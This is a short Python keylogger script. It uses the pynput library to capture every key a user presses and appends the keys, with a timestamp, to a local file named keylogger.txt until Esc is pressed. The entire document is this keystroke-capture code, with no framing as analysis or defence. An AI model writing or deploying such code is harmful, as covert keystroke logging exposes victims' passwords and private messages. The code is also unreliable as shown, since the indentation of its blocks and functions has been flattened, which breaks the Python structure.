from pynput.keyboard import Key, Listener 
from datetime import datetime 

count = 0 
keys = [] 

with open("keylogger.txt", "a") as f: 
 f.write("\n\n") 
 f.write("--------------------------------------------------------------------")  
 f.write("\n\n") 
  
with open("keylogger.txt", "a") as f:
f.write("TimeStamp"+(str(datetime.now()))[:-7]+":\n")  
f.write("\n") 

def on_press(key): 
 global count, keys 
 keys.append(key) 
 count += 1 
 if count >= 1: 
 count = 0 
 write_file(keys) 
 keys = [] 
  
def on_release(key): 
 if key == Key.esc: 
 return False 
  
def write_file(key): 
 with open("keylogger.txt", "a") as f: 
 for key in keys: 
 k = str(key).replace("'", "")  
  
 if k.find("space") > 0: 
 f.write(' ')
 elif k.find("tab") > 0: 
 f.write(' ') 
 elif k.find("enter") > 0: 
 f.write('\n') 
 elif k.find("shift") > 0: 
 f.write('') 
 elif k.find("backspace") > 0: 
 f.write('') 
 elif k.find("cmd") > 0: 
 f.write('') 
 elif k.find("key") == -1: 
 f.write(k) 

with Listener(on_press=on_press, on_release=on_release) as listener:  
listener.join()

